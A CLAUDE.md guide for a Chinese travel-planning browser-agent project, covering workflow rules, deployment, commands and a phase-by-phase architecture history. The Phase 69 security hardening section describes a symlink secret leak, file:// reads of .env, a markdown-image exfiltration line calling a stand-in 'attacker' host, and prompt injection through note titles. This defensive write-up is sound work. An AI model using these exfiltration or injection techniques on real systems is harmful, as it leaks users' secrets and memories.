# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## 开发流程规范 (MANDATORY development workflow)

所有新增功能或较大改动都必须遵守以下流程，文档统一存放在 `docs/` 目录下（可按需在子目录中继续分类）：

1. **开发前 — 写计划**：每个新增功能或大改动，先在 `docs/task_plans/` 写一份
   task plan / 开发文档并留存（目标、方案、涉及模块、验收标准）。开发过程中如方案调整，
   同步更新该文档。
2. **踩坑 — 写记录**：开发中遇到坑（环境问题、坑爹的 API 行为、难缠的 bug 等），
   在 `docs/pitfalls/` 生成一份踩坑文档（现象、原因、解决办法），供后续查阅。
3. **完成后 — 写测试用例**：功能完成后，必须在 `docs/test_cases/` 生成对应的测试用例，
   并落地为可运行的自动化测试。**只有当该功能的所有测试用例全部通过，才算「初步完整」**，
   否则功能视为未完成。

`docs/` 目录约定：

| 子目录 | 用途 |
| --- | --- |
| `docs/task_plans/` | 开发前的 task plan / 开发计划文档 |
| `docs/dev_docs/` | 设计与开发说明、架构文档 |
| `docs/pitfalls/` | 踩坑记录 |
| `docs/test_cases/` | 测试用例说明（配合可运行的自动化测试） |

以上目录仅为默认分类，可自行创建新的子文件夹继续细分。

## Current state

This is **Travel Browser Agent（旅行智能体 / 个人旅行规划浏览器智能体）** — a personal
travel-planning platform. The user enters a natural-language travel request; an Agent
drives a real Chrome browser via Chrome DevTools MCP to browse hotel/guide/map pages,
extracts structured info, and generates a full itinerary with budget. See the full
product and technical specs in `docs/dev_docs/PRD.md` and `docs/dev_docs/开发文档.md`.
**全系统架构总览（Phase 1-21，含拓扑/链路/子系统/不变式/踩坑索引）见
`docs/dev_docs/系统架构总览.md`** — 了解系统现状先读它。

As of now the repo is a freshly-created PyCharm scaffold — it contains only the default
`main.py` sample (a `print_hi` stub); no real application code, dependencies, tests, or
build configuration exist yet. Treat everything below as a starting point to be replaced
as the project grows.

## Deployment server

SSH 密钥登录已配置（`ssh ubuntu@42.194.202.233` 免密）。

- Host: `42.194.202.233`　User: `ubuntu`
- **密码不写在仓库里**：需要密码登录时找项目管理员要；日常运维一律用 SSH 密钥。
  （2026-08-13 开源协作前移除了此处的明文密码。）

**线上体验地址**：https://17tongyou.com （自动跳 `/travel/`）。裸 IP `http://42.194.202.233/travel/`
仍可用作调试入口（不跳 https，无证书）。

**域名 / HTTPS / 备案**（2026-07 落地）：
- 域名 **`17tongyou.com`**（DNS 托管 DNSPod，A 记录 `@`/`www` → `42.194.202.233`）。
- **ICP 备案已通过**：`鄂ICP备2026020535号-2`（主体腾讯云）。备案号已悬挂在登录页页脚
  （`frontend/src/Auth.tsx` 的 `.auth-beian`，链工信部 beian.miit.gov.cn）——工信部硬性要求，别删。
  ⚠️ **公安联网备案（beian.mps.gov.cn，30 天内）待办**：数据码 `7e985a59f45baf0e8e75203a289a736f`，
  批下来的公安备案号也要并排挂到同一页脚。
- **HTTPS**：Let's Encrypt 证书（certbot，webroot=`/var/www/html`，90 天**自动续期**已配），
  证书在 `/etc/letsencrypt/live/17tongyou.com/`。**443 已在轻量防火墙放行**。
  ⚠️ 之前"443 被中间网络重置"是**未备案时的 SNI 拦截**，备案 + 防火墙放行后已解决——
  该老坑作废，443/HTTPS 现正常对外。

服务器部署架构：
- **nginx**（:80 + :443）：`/etc/nginx/sites-enabled/default` 三段——①域名 :80 →
  301 跳 https（保留 `/.well-known/acme-challenge/` 供续期）；②catch-all `default_server`
  同时听 :80/:443（裸 IP 走 http 调试、域名走 https），根 `location = /` 302 → `/travel/`，
  反代 `/travel/`→ 后端 :8080、`/t/`、`/_AMapService/`；证书 `ssl_certificate` 指向 letsencrypt。
  改配置务必把备份放到 `sites-enabled/` **之外**（该目录 `*` 全加载，备份会撞 default_server）。
  - ⚠️ 后端 :8080 仍**不对外**（外网只开 80/443），必须走 nginx 反代，别直接暴露 8080。
- **travel-backend.service**（systemd，:8080）：FastAPI + 托管前端构建产物
- **PostgreSQL**（本机 localhost，后端直连，不走隧道——隧道只在本地开发用）
- **Langfuse**（Phase 24 自托管）：`/home/ubuntu/langfuse/` docker compose
  （ClickHouse/Redis/MinIO/web/worker，内存限额裁剪版，PG 复用宿主实例）。UI 只听
  127.0.0.1:3000，`ssh -L 3000:localhost:3000` 访问；密钥在该目录 .env；后端埋点经
  `LANGFUSE_HOST=http://localhost:3000`。坑见 docs/pitfalls/langfuse自托管小内存与v4API.md。
- **Chrome**：**每用户浏览器池**（Phase 19）。后端按需为每个 user_id 拉起独立 Chrome +
  独立 profile（`/home/ubuntu/chrome-agent-profiles/{user_id}`，各自扫码、登录持久互不覆盖）。
  服务器 `.env`：`BROWSER_POOL_ENABLED=true` `BROWSER_POOL_MAX=2` `CHROMIUM_PATH=/snap/bin/chromium`
  `BROWSER_POOL_PORT_START=9300` `REMOTE_BROWSER=true`。**原 travel-chrome.service 已停用**
  （Phase 68 复核：此前只 disable 未 stop，进程实际一直活着占 :9222 且是池外旁路，
  现已 `stop + disable` 真正停掉；`/api/agent/run` 已改为透传 user_id 走池，不再依赖它）。
  本地开发 `BROWSER_POOL_ENABLED` 不设
  → 回退单调试 Chrome（`CHROME_DEBUG_URL` + start_chrome.sh）+ 全局串行。
  见 docs/pitfalls/snap-chromium多实例与小内存.md。
- **xhs-mcp 容器**：**启动配置已固化**在 `/home/ubuntu/xhs-mcp/docker-compose.yml`
  （2026-08-14 从运行中容器导出；此前无任何启动脚本，容器重建会丢配置）。重建：
  `cd /home/ubuntu/xhs-mcp && docker compose up -d`。内存限制 **1.5GiB**（800MiB 下容器内
  chrome 搜索高峰会 OOM——16:21/16:23 两次内核杀进程，深度研究期间 xhs 不稳）。

**重新部署**：本地 `frontend` 改动后 `npm run build && cp -r dist/. ../backend/static/`，
⚠️ **末尾的 `/.` 不能省**——`cp -r dist ../backend/static` 在 static/ 已存在时会把整个 dist
拷成子目录 `static/dist/`，index.html 仍是旧的，前端改动看起来「没生效」（2026-08-13 踩过，
见 `docs/pitfalls/前端构建产物拷成了嵌套目录.md`）。
再跑 `backend/deploy/deploy.sh`（rsync + 装依赖 + 重启服务）。

服务管理：
```bash
ssh ubuntu@42.194.202.233 'sudo systemctl restart travel-backend'
ssh ubuntu@42.194.202.233 'sudo journalctl -u travel-backend -n 50 --no-pager'
```

## Environment

- Backend: Python 3.12 venv at `backend/.venv`（本机 `python3.12`；PyCharm 里显示的 3.9 已过时）
- Frontend: Node 23 + Vite + React-TS（`frontend/`）
- LLM: DeepSeek（OpenAI 兼容接口），key 在 `backend/.env`；模型分层 v4-pro（规划/抽取）+ v4-flash（分类）
- DB: 远程 PostgreSQL 16（部署在上面的服务器），**必须走 SSH 隧道**，不能公网直连
  （原因见 `docs/pitfalls/远程PostgreSQL公网直连被重置.md`）

## Running

```bash
# 一键启动后端（隧道+调试Chrome+uvicorn，前台）：
backend/scripts/dev.sh
# 前端另开终端：cd frontend && npm run dev  →  http://localhost:5173
```

**断点调试**：不要用 dev.sh（shell 套子进程断点挂不上）。先跑 db_tunnel.sh（必须）和
start_chrome.sh（调浏览器链路才需要），然后 PyCharm 里右键 `backend/debug_server.py` →
Debug（内部 `uvicorn.run(..., reload=False)`——reload 会 fork worker 导致断点失效）。
前提：`backend` 目录已 Mark as Sources Root、解释器选 `backend/.venv`。

分步等价于：

```bash
# 1. 数据库隧道（幂等，后端启动前必须先跑）
backend/scripts/db_tunnel.sh

# 2. Agent 专用调试 Chrome（端口 9223 + 独立 profile，原因见 docs/pitfalls/Chrome远程调试端口的两个坑.md）
backend/scripts/start_chrome.sh

# 3. 后端
cd backend && .venv/bin/uvicorn app.main:app --reload --port 8000

# 4. 前端
cd frontend && npm run dev   # http://localhost:5173
```

## Testing

```bash
cd backend && .venv/bin/python -m pytest tests/ -q     # 全部单测
cd backend && .venv/bin/python -m pytest tests/test_action_guard.py -q   # 单个文件
```

**评估集**（`backend/evals/`，真实 LLM 调用，不进 CI，定位是大改动前后的手动对照）：

```bash
cd backend
.venv/bin/python -m evals.route_eval   --tag before   # 路由三分类，35 条 ~1 分钟
.venv/bin/python -m evals.fetch_samples               # 抽取样本（不进 git，校验 sha256）
.venv/bin/python -m evals.extract_eval --tag before   # 本体抽取，5 篇固定攻略
.venv/bin/python -m evals.runner --user … --tag before  # 端到端输出质量，一轮 ~1 小时
.venv/bin/python -m evals.compare evals/runs/{before,after}.json
```

⚠️ **本机连不上 `api.deepseek.com`**（服务器可以）——评估要在服务器上跑：
`ssh ubuntu@42.194.202.233 'cd /home/ubuntu/travel-agent/backend && .venv/bin/python -m evals.…'`。
断网时报表会打「🚨 N 条没跑成」并退出码 2，**不会**把它算成模型判错
（见 `docs/pitfalls/评估器把断网算成了模型判错.md`）。

## Architecture (backend)

**Phase 1 — 单页分析**（`POST /api/agent/run`）：`travel_task` 落库 → BackgroundTasks →
`app/agent/runner.py` → `ChromeMCP` → `BrowserTool` → Action Guard 三层判定 →
`app/agent/extract.py` 结构化抽取 → 写 `travel_page`/`travel_task`。

**Phase 2 — 对话式攻略**（`POST /api/chat/{cid}/messages`）：`app/api/chat_api.py` →
BackgroundTasks → `app/agent/orchestrator.py`：
解析需求(PreferenceNode) → 拆解搜索任务(TaskPlanNode) →
`BrowserTool.search_web`(必应) 抓多来源(登录墙来源跳过) → 汇总 →
`LLMClient.generate_with_reasoning` 生成 Markdown 攻略（带思考过程）→
写 `travel_message`（role: user/assistant/progress，assistant 带 `reasoning`+`sources`）。
前端轮询 `GET /api/chat/{cid}/messages` 渲染对话流、可折叠思考、进度气泡、导出长图。
多轮修改：已有 sources + 目的地不变 → 复用来源只重新生成，不重复搜索
（例外：本轮是酒店需求且旧来源无酒店类来源 → 仍走站点路由）。

**Phase 3 — GPT 风格界面 + 站点路由**：前端为 ChatGPT 式布局（侧边栏会话列表 /
居中空态 / 右侧用户气泡 + 全宽助手正文 / 「已深度思考」折叠 / 胶囊 composer）。
`app/agent/site_router.py`：意图判定（LLM `Preference.intent` + 关键词兜底）→
hotel 意图打开携程；route 意图的小红书路由**默认关闭**（`XHS_ENABLED=false`，
小红书风控封锁云 IP，路线规划走必应搜索）；命中登录墙时写带 `meta.handoff` 的
progress 消息（前端渲染登录卡片），轮询 `BrowserTool.check_page()`（只 snapshot
不导航，避免打断用户登录输入）等用户登录，超时/失败回退必应搜索。
hotel 意图用 HOTEL_SYSTEM 生成酒店推荐，其余用 ITINERARY_SYSTEM。

**Phase 5 — 登录墙远程接管**：服务器 headless 模式命中登录墙时同样暂停等待：
每轮轮询把登录页截图存 `{tmp}/travel_handoff/{cid}.jpg`，前端 handoff 卡片
（mode=remote）内嵌 `GET /api/chat/{cid}/handoff-screenshot` 4s 刷新展示，
用户用携程/小红书 App **扫码登录**（无键鼠转发，纯短信表单登录页会等到超时回退）。
登录成功 → 重开目标页继续抓取；超时/失败回退必应。等待结束删除截图。
headless Chrome 不再 `--isolated`（持久 profile，扫码一次长期有效）。
注意：用户在自己浏览器登录站点对 Agent 无效（cookie 不互通），必须扫 Agent 的码。

**Phase 15 — 登录/注册 + 按用户隔离**：`TravelUser`/`TravelSession`（token→user，
pbkdf2 密码，纯 stdlib，`app/auth.py`）。`app/api/deps.py` 的 `get_current_user`
从 `Authorization: Bearer` 解析用户，所有业务路由需登录。会话/记忆/站点登录记录
加 `user_id` 隔离；agent 全链路透传 user_id（run_conversation_turn→graph→
orchestrator→memory/site_router）。携程 cookie 共享浏览器：切用户时清 cookie
（`_expire_stale_logins` 检测归属变化）。admin 账号（`ADMIN_USERNAME/PASSWORD`）
拥有旧数据 + `/api/admin/users`。启动 `app/db/migrate.py` 幂等加列/建表/引导 admin/
旧数据归 admin。前端 `App.tsx` 鉴权门，`Auth.tsx` 登机牌登录界面，`api.ts` 的
authFetch 带 token（401 回登录）。**注意：img/staticmap/handoff-screenshot 经 <img>
加载不能带 header，保持不鉴权（cid 不可猜）**。

**Phase 14 — LangGraph 反思循环**：Agent 编排改用 LangGraph（`app/agent/graph.py`
+ `nodes.py` + `graph_state.py`）。图：parse→collect→generate→critique→
（finalize / research补搜→generate / rewrite重排→generate），最多
`graph_max_guide_rounds`(2) 轮；海报同理（`poster.py` 内 critique 循环）。
自检用**快模型 v4-flash + 务实提示**（默认放行只挑硬伤）且**静默**，大多不循环仅 +几秒。
关键：`_is_running` 改为「有流式 assistant→运行中；有终稿 assistant 且无流式→完成」——
反思会在终稿后留 progress、海报是终稿攻略后的新流式占位，旧的「看最后一条」会误判
（踩坑）。海报生成先占流式消息、前端点按钮后重启轮询接住结果。`reflection_enabled`
可整体关闭退化为单次生成。node 复用 orchestrator 里的采集/生成函数，不重写。

**Phase 13/18 — 手账「城市旅行路线图」海报**：攻略消息「🎨 生成手账海报」→
`POST /api/chat/{cid}/poster` → `app/agent/poster.py` 后台：LLM 抽 `PosterData`
（title/theme/subtitle + stops[day,order,name,type,note] + day_meta[路线名] +
hotels/foods/specialties/tips）→ 高德 POI 限流并发补坐标+实景图 → 组装
`meta.poster`（逐天路线图 + 每天路线名/haversine 距离/时长 + 右栏推荐）。
高德静态地图走 `/api/staticmap`（`app/api/staticmap_api.py` 后端签名代拉，key 不进前端），
实景图走 `/api/img`。前端 `PosterView` 渲染**小红书国风路线图版式**：毛笔城市标题+朱印+
主题短语 / 左路线卡（编号色=地图 marker 色）/ 中逐天地图+图例 / 推荐带两栏
（美食+特产 | 酒店+贴士，`.rmap-recs`）/ 底路线一览。固定 880px 宽套 `overflow-x:auto`，
html2canvas 截全图；图加载失败回退 emoji；空的推荐分区自动隐藏。
坑：高德静态图 marker 上限≈10（故逐天出图，非全程一张）、POI 搜索 QPS 限流需
退避重试+Semaphore 限并发——见 `docs/pitfalls/高德静态图marker上限与QPS限流.md`。

**Phase 12 — 攻略配图**：景点图（高德 POI photos）+ 酒店图（携程卡片 img）
经 `GET /api/img?u=`（`app/api/img_api.py`，白名单 autonavi/amap/c-ctrip/tripcdn
防 SSRF）同源代理。来源 dict 带 `images:[{name,url}]`，orchestrator 聚合成
prompt 图名单，模型用 `[[img:名称]]` 占位符插图；`_embed_images` 替换占位符，
终稿再对未用图按 ### 标题/加粗/列表行**兜底插入**（模型漏插时酒店仍每家配图）。
流式中只替换占位符、剥残片、不兜底。前端 html2canvas 加 useCORS。

**Phase 11 — 提速**：攻略生成为**流式**（先落 meta.streaming=true 的 assistant
消息，每 ~0.5s 增量更新（`streaming_flush_interval_s`，2026-08-13 由 1.2s 调快，
配合前端 800ms 轮询 + `mergeMessages` 增量合并 + `useTypewriter` 打字机平滑），
终稿去标记；`_is_running` 视 streaming 为运行中，
启动修复会就地终稿被打断的流式消息）。一轮共享一个浏览器会话（勿在会话内
调 `_expire_stale_logins`，它可能重启 Chrome）。抓取来源 summary 用
`_excerpt` 清洗摘录（无 LLM 摘要调用）；页面分类长正文规则快判。
线上实测：总时长 3-6min → ~130s，首段回复 82s 可见。
**2026-08-13 晚再提速**（Langfuse trace 实测一轮 6 分 52 秒：小红书详情串行 163s +
生成 200s 是两大头）：① **小红书×必应并行采集**（`collect_sources` 未复用时
`asyncio.create_task(_collect_xhs)` 与浏览器同时跑，xhs 是 HTTP MCP、必应是 ChromeMCP
两通道独立；xhs 收成 0 再补 full 第 2 查询）；② **生成思考精炼**（ITINERARY/HOTEL
system 要求思考两三行要点，此前思考链 1.5 万字吃满 16000 token 预算）；③ **quick take
空 content 修复**（DeepSeek 思考模式偶发 content 为空——token 全在思考链；max_tokens
400→1000 + reasoning 前 200 字兜底，guide 与 deep_research 两处同修）；④ 服务器 .env
`XHS_NOTES_PER_TURN=3` `XHS_REUSE_MAX_DAYS=14`。目标总时长 ≤4 分钟。
完整改造复盘（诊断方法论/前后对比/踩坑）见 `docs/dev_docs/流式输出与生成提速改造-2026-08-13.md`。

**Phase 10 — 高德地图**：`app/tools/amap.py` httpx 直连 restapi.amap.com
（数字签名：字典序 k=v& + AMAP_SECRET 取 MD5）。每轮收集来源时并入
「高德实时数据」来源（天气预报 + 景点 POI 评分/坐标，秒级）；
攻略生成参考天气与坐标就近原则。key 复用铺探项目 Putan-Lite-web。

**Phase 8 — 携程城市动态解析**：城市 ID 三级解析（静态表 → `travel_ctrip_city`
DB 缓存 → 页面内直调携程建议接口 `soa2/34951/getHotelKeywords` 取 keywordId）。
UI 自动化不可行（携程校验 isTrusted），接口直调是唯一稳妥路径。
MCP 三层自愈：45s 超时 → 重连重试 → 远程模式杀 Chrome 由 systemd 重启再试；
进程级 MCP 串行锁防并发客户端互相搞死 CDP。

**Phase 7 — 登录来源确认**：搜索抓取遇到需登录来源不再静默跳过：写 meta.confirm
的 progress 消息（前端确认卡片「登录读取/跳过」），用户点击经
`POST /api/chat/{cid}/confirm` 落 role=action 隐藏消息，后台 `wait_confirm` 轮询，
超时 60s 默认跳过；选登录则复用扫码接管后重读该来源。同域每轮只问一次、
最多问 2 次。`ChromeMCP.call` 带 120s 兜底超时（mcp 僵死降级为可恢复异常）。
多轮修改判定 `decide_revision()`：目的地没换且已有来源类型覆盖本轮意图才复用
（先查酒店再要行程 → 必须重新走路由+搜索）。

**Phase 4 — 记忆系统**：`app/agent/memory.py` + `travel_memory` 表。
两类记忆：历史会话引用（recall_past_chats，目的地匹配旧会话）+ 提炼型长期记忆
（每轮回复后旁路 v4-flash 提炼，模型对照已有记忆输出 add/update/delete 操作）。
检索为全量注入（个人量级，无向量库；量大再上 pgvector，注意 DeepSeek 无 embedding
接口）。注入点：需求解析 + 攻略生成。assistant meta 带 `memories_used`/`memories_saved`，
前端「🧠 记忆 · N」折叠卡片 + 「已记住」提示 + 侧边栏记忆管理面板；
API：`GET /api/memory`、`DELETE /api/memory/{id}`。
前端 Markdown 渲染必须带 remark-gfm（否则表格全烂）。

**Phase 17 — 记忆 triplet 归槽**（替代纯追加）：每条记忆挂一个规范 `key`（三元组谓词，
`travel_memory.key`），强制**每个 (user_id, key) 只留一条**。四条策略无向量落地：相同 key
覆盖（`apply_ops` 走 `_upsert_by_key`）/ 相似合并（LLM 把近义信息归到同一 canonical key，
见 `memory.CANONICAL_KEYS`：口味/兴趣/节奏/预算/住宿/出行/常驻城市/忌口/同行/当前行程）/
时间更新优先（覆盖 bump updated_at）/ 明确表达优先（`explicit` 列 → weight=2.0 且粘性）。
「当前行程」是单槽，行程不再堆积。`_prune` 按 `memory_max_rows`(40) 兜底剪枝。
存量清理：`consolidate_memories(db, uid, llm)` 用 LLM 把零散记忆重写成规范三元组整体替换，
经 `POST /api/memory/consolidate`（前端记忆面板「✨ 整理记忆」按钮）触发。

**Phase 16 — 停止 + checkpoint 续跑**：对话式攻略走 LangGraph（`app/agent/graph.py`
`_build_graph()` 拓扑 + 条件边），用 `AsyncPostgresSaver`（复用现有 PG，非 MongoDB）按
thread_id=用户消息 id 存 checkpoint。停止是**协作式取消**（`app/agent/cancel.py`：线程安全
cid 集合，`check(cid)` 在搜索/抓取/流式生成各处抛 `TurnCancelled`），前端 `running` 时发送键
变黑色停止方块 → `POST /api/chat/{cid}/stop`。崩溃续跑：`travel_inflight_turn` 登记在途 turn，
启动时 `resume_inflight_turns()` 后台线程 `resume_turn(turn_id)` 从 checkpoint 续跑（仅 10min
内、先删孤儿 streaming）。近 5 轮对话（`settings.history_rounds`）经 state 传入图节点。
依赖：`langgraph-checkpoint-postgres`、`psycopg-pool`。启动 msgpack 告警见 pitfalls，不阻塞。

**Phase 19 — 每用户浏览器池**：`app/tools/browser_pool.py`（线程安全键控池）：每 user_id 一个
独立 Chrome + 持久 profile（各自扫码、登录互不覆盖跨重启保留）。`acquire(user_id,on_wait)`
按需拉起/复用/满池驱逐 LRU 空闲/都 busy 排队（`on_wait` 回调写「排队中」progress，
见 orchestrator `_queue_cb`），`release`/`restart`/空闲 reaper。`ChromeMCP(user_id=…)` 池模式走
acquire（busy 即每用户串行）替代全局 `_MCP_GLOBAL_LOCK`；不同用户并行（≤`browser_pool_max`=2，
内存约束）。`_expire_stale_logins` 池模式不再清 cookie。启动 `cleanup_orphans()` 杀端口段孤儿。
`browser_pool_enabled` 关则回退单浏览器全局串行（本地开发）。坑见 snap-chromium多实例与小内存.md。

**Phase 77 — 旅行预演与灵感入口**：登录后新会话首屏是单入口自动分流：输入含公开链接→收藏
整理；输入为空但有出发地+预算→预算推荐；纯短地名→旅行预演；其他问题原样交给后端路由。
前两类必须在本条请求直接覆盖
`deep_reasoning=true`，不能依赖先 `setDeep(true)`；分享文本只提取最多 5 条 HTTP(S) URL。
当前不承诺图片视觉理解。详见
`docs/task_plans/旅行预演与灵感入口改造-2026-08-07.md`。

**Phase 78 — 热门目的地图片卡片与单入口回归**：空状态只留一个 textarea，不再展开第二
Composer。近 30 天真实热门榜前 4 名在输入框下显示图片卡；封面由独立
`GET /api/onboarding/covers` 异步从高德 POI 补充并做成功/空结果 TTL 缓存，失败不阻塞首页，图片
仍经 `/api/img` 同源代理。点击卡片只回填主输入。桌面四列、移动横向 snap，视觉改为深色静态
标题+局部柔光。详见 `docs/task_plans/热门目的地图片卡片与单入口回归-2026-08-07.md`。

**Phase 79 — 第一视角旅行实境预演**：首页新增天堂寨实境横幅与懒加载全屏体验。后端
`/api/immersive/preview` 返回 6 幕人工校准场景并从高德 POI 补图（并发 2、成功/空结果 TTL、失败
降级）；前端提供峡谷/主峰分支、时间/环境/体力/花费 HUD、结算和转现有攻略链路。所有模拟值
明确非实时，图片只走 `/api/img`，移动与 reduced-motion 已适配，不做重型 3D。

**Phase 80 — 互动旅行电影样片**：全屏体验改为环境延展 + 电影取景框，移除常驻 HUD；天堂寨
首幕使用明确标注“氛围演绎”的项目内 WebP 主视觉，真实 POI 图只作为地点参考。用户可通过
鼠标/触控产生轻量视差，普通场景需要长按 900ms 或按住空格推进；体力和花费改为按需查看，
路线分支、结算、转行程、移动端与 reduced-motion 降级保持完整。

**Phase 70/71 — 邀请码注册 + 长任务等待体验**：
① **邀请码**：`settings.register_invite_code`（留空=开放注册，本地开发行为不变；线上 .env 配
`REGISTER_INVITE_CODE`）。**只校验注册，登录不校验**——存量用户不会被锁在外面。
② **快答先行**（`deep_research._emit_quick_take`）：深度研究 4-6 分钟，用户常以为卡死就退出。
现在启动后立刻用 v4-flash 给一份 150 字内初步判断（无浏览器无来源），`meta.preliminary=true`，
前端渲染橙色徽章；完整版随后照常产出。**顺序不变式：流式占位必须在快答之前建立**——快答是
非流式 assistant 消息，没有占位时 `_is_running` 会判本轮完成、前端停止轮询、完整版永远收不到
（同 Phase 14 那个坑）。双保险：`_is_running` 用 `_preliminary()` 把它排除在终稿判定之外。
`deep_research_quick_take` 可关，失败/被停止都不影响主流程。
**guide 链路同款**（2026-08-13）：`quick_take` 图节点（parse→quick_take→collect）先建流式
占位再发初步规划思路（`orchestrator.emit_guide_quick_take`，`guide_quick_take` 可关）。
配套：`apologize_node` 与 `_ensure_stopped_message` 必须**就地终稿占位**（空占位也要终稿
「已停止本轮。」），否则 streaming 残留让前端永远判运行中——有回归测试钉住。
③ **进度报「发现」而非「动作」**：`research_tools._found()` + `_gist()`，工具每返回一批结果就播
一条带实质内容的进度；前端 `.thinking-trail` 渲染成足迹列表（最近 5 条、越旧越淡），
等待期变阅读期，也是「它还活着」的持续证据。
④ **预期管理 + 可离开**：`interaction.ts` 的 `THINKING_EXPECTED_SEC`/`thinkingProgressRatio`
（超时不回退不满格，缓慢逼近 1）/`waitReassurance`（分段文案）；UI 显示「通常 4-6 分钟」+
对照预期的进度条（超时转琥珀色）。静默文案不再暗示卡死，改为「属正常 + **可以关掉页面**，
任务在服务器继续跑」。
**诊断结论值得记住：长任务流失的原因不是「久」，是「不知道还要多久」+「静默空隙」。**

**Phase 69 — 注入/外带/逃逸加固**（安全审计后的修复，全部有回归测试
`tests/test_security_hardening.py`）：
① **沙箱产物软链外泄（已在生产验证成立的高危）**：`_collect_sandbox_artifacts` 跑在**宿主进程**
（uid=ubuntu，读得到 .env），而 `shutil.copy2` 默认跟随软链 —— 容器内 `ln -s .../backend/.env x`
即可让宿主把密钥拷进**不鉴权**的产物下载目录。现改为：跳过 `islink` + `realpath` 必须仍在沙箱
目录内 + `copy2(follow_symlinks=False)` 三重。**凡"高权限进程读低权限区域的文件"都要这么做。**
② **`app/tools/url_guard.py`（新）**：`open_page` 此前**零 URL 限制**（`action_guard` 里
navigate 永远放行），而它是深度研究 agent 的工具、URL 由模型决定、模型又在读不可信网页 ——
`file:///.../.env` 直接可读。现在 `open_page` 与 `fetch_url` 统一走 `ensure_safe_url`：
scheme 白名单（仅 http/https）+ 内网/回环/**link-local(169.254.169.254 云元数据)** + **解析 DNS
后复验**（防域名解析到内网）。**这类问题必须在工具层堵，prompt 写规矩没用。**
③ **数据外带**：LLM 输出 `![](http://attacker/?d=<记忆片段>)` 一渲染就是 GET，完全绕过 img_api
白名单。双层修：`main.py` 加 **CSP**（`img-src 'self' data: blob:` + `connect-src 'self'` +
`frame-ancestors 'none'`）+ 后端 `_strip_foreign_images` 在 `_embed_images` 里剥掉非
`/api/img`、`/api/staticmap` 的 markdown 图片。（前端不渲染原始 HTML，故只需管 markdown。）
④ **注入防线补边角**：`wrap_external` 的 `url`/`title` 属性此前**原样内插**，一条标题带
`"></external_content>` 的小红书笔记即可穿透主防线 → 现属性也过清洗+转义；
`EXTERNAL_POLICY` 补到此前裸奔的二级调用：**记忆提炼**（最要紧，注入可跨会话持久并借 key 归槽
覆盖真实槽位）、`extract.py` 全部、poster/budget，以及持有工具的两个 subagent prompt。
⑤ **沙箱磁盘 + zip 炸弹**：`/workspace` 是宿主绑定挂载，docker 限不了磁盘
（`--storage-opt` 依赖存储驱动）→ `execute()` 前后查用量，超 `docker_sandbox_workspace_max_bytes`
(64MB) 清理新增大文件；zip 总量校验改为**按真实解压字节流式累加**（zip 头申报的 `file_size`
是攻击者可写的）。
**保留不动的正确设计**：`context_security` 的 tool 角色注入 + 明确放弃"过滤『忽略之前的指令』"
这类模式匹配；容器的 `--network none`/`cap-drop ALL`/`no-new-privileges`/`--user nobody`/
只读根 fs/mem-cpu-pids 限额；技能的 zip-slip、命名空间逃逸与跨用户隔离。

**Phase 68 — 接口鉴权收口 + 追问熔断 + 小红书只读白名单**：
① **安全**：`/api/agent/run`、`/api/agent/tasks/{id}`（Phase 1 遗留）此前**公网完全无鉴权**，
任何人可驱动服务端浏览器访问任意 URL（SSRF）——已加 `get_current_user`；`travel_task` 加
`user_id` 列（幂等迁移，存量归 admin），非本人任务返回 404（不用 403，避免泄露存在性）。
`tests/test_agent_api_auth.py` 有 **AST 全量路由扫描**护栏：新增路由默认必须带鉴权，
有意公开的（register/login、`<img>` 类的 img/staticmap/handoff-screenshot、分享短链）
须登记进 `PUBLIC_ROUTES`，且登记表不许留过期条目。
② **追问熔断**：此前「空目的地即反问」是唯一出口且**无任何次数上限**，用户说
「你安排一个热门的」也照样被无限追问（真实死循环）。现改三级降级：`Preference.let_agent_decide`
（建模「你决定/随便/都行/看着办」）→ 连续追问达 `clarify_max_rounds`(2) 强制代选
（`_decide_destination` 用 v4-flash 从历史候选里挑，仍过 `_normalize_destination` 防占位词）
→ 都不行才反问，且第二次起追问文案主动给出「也可以说『你定』」的出路。代选结果写进
`pref.special_requirements`，让生成端在开头说明是代选、可随时更换。
③ **小红书白名单**：该 MCP 是第三方镜像（xpzouying/xiaohongshu-mcp），除搜索/详情外还暴露
`publish_content`/`post_comment_to_feed`/`like_feed`/`delete_cookies` 等**写工具**，而登录态是
**全平台共享的单个运维账号**（`/home/ubuntu/xhs-mcp-data/cookies.json`，无 user_id 维度）。
`_call_tool` 已硬编码只读白名单 `{search_feeds, get_feed_detail}`，非白名单直接抛
`XHSToolNotAllowed`（**在建连之前**拒绝）。**决策：小红书不做租户隔离**——它登录只为过风控读
公开笔记，不涉个人数据，隔离无正确性收益；反而会把写操作风险和封号风险转嫁到用户真实社交账号，
且第三方镜像写死单 cookie 文件、per-user 需每人一个内置 Chrome 的容器（内存扛不住）。
与携程不同：携程登录是为看**属于用户自己**的数据，隔离是刚需（已由每用户浏览器池实现）。
④ **文档订正**：`site_login_ttl_min=60` 在池模式下是**死代码**（`_expire_stale_logins` 直接
提前返回），登录态实际寿命 ≈ 站点 cookie（携程约 13 个月、小红书约 1 年），profile 永不删除、
被 LRU 驱逐只杀进程不删目录，跨重启保留。

**Phase 67 — 预算明细面板 + 预约提醒**：攻略消息「💰 预算明细」→
`POST /api/chat/{cid}/budget` → `app/agent/budget.py` 后台（照搬 poster 模式：占位流式消息 →
LLM 抽取 → `_finalize` 写 `meta.budget`）：v4-flash 从攻略正文抽 `BudgetData`
（`schemas/budget_schema.py`：items[category/name/day/amount/note] + reservations[name/
channel/advance/note] + headcount/notes）→ `build_budget_payload()` **服务端重算汇总**
（分类归一复用 `trip_planner.normalize_budget_category`，剔除「合计」行与非正数，
day=0 归 shared，算 total/group_total/by_category 占比/by_day）。
**关键不变式：金额一律人均口径；total 由逐项求和得出，绝不采信模型给的总额**——让模型算总额会
输出 `"total": 30+54+120=324` 这类非法 JSON（TripStar 因此被迫写正则 eval 修复，我们不重蹈）。
前端 `BudgetView`（Home.tsx）渲染预约提醒块 + 分类占比条 + 可筛选明细表 + 逐日胶囊；
`memory.py` 的攻略判定已排除 `meta.budget`。无预算攻略给友好提示而非编造。

**Phase 83 — 接力站真实热门推荐与动效搜索**：同游圈首屏先复用 `/api/onboarding` 的近 30 天
真实热问目的地，再用 `/api/onboarding/covers` + `/api/img` 补高德实景封面；失败回退静态灵感时
更换榜单文案，不伪装实时热度。四张图片卡先于搜索展示，点击直接进入对应接力站；顶部复用现有
React Bits `Aurora`（低透明、pointer-events none、低动态偏好不挂载）。搜索降级为第二入口，
使用渐变玻璃胶囊并完整清除 input 原生 border/outline/appearance/box-shadow。移动端热门卡横滑吸附。
